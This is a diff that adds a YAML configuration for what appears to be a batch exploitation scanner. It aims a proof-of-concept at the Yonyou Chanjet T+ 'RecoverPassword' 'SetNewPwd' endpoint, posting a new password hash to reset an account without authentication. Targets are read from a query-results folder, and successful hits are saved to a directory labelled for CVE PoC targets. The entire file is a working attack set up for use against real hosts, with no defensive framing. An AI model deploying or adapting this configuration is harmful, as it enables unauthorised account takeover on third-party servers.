@@ -1,0 +1,17 @@
+targetPath: /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd
+targetMethod: post
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+    https: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+    Content-type: application/x-www-form-urlencoded
+targetJson:
+    {"pwdNew":"46f94c8de14fb36680850768ff1b7f2a"}
+targetData:
+targetReExpression:
+    respStatusCode: 200
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/用友畅捷通重置账户秘密/
+targetRestText: 2
